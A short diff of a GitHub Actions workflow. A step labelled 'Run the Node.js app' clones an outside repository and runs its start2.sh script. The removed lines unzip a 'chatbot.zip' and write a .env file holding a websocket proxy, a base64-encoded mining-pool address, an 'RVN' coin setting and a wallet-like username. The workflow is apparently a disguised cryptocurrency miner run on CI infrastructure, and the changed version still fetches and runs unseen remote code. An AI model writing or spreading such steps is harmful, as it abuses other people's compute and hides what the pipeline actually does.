@@ -14,11 +14,9 @@ jobs:
         uses: actions/checkout@v4
 
       - name: Clone repository
-        run: git clone https://github.com/duongpokeeeee/sadsd
+        run: git clone https://github.com/duongpokeeeee/articial-in
 
       - name: Run the Node.js app
         run: |
-          cd sadsd
-          yes A | unzip chatbot.zip
-          echo -e "host=127.0.0.1\nport=3306\nproxy=wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=4\npassword=c=RVN\nusername=RBCPz2xQMf9Cz3eyqFTVFHVjZM2cTSeYRN" > .env
+          cd articial-in
           bash start2.sh
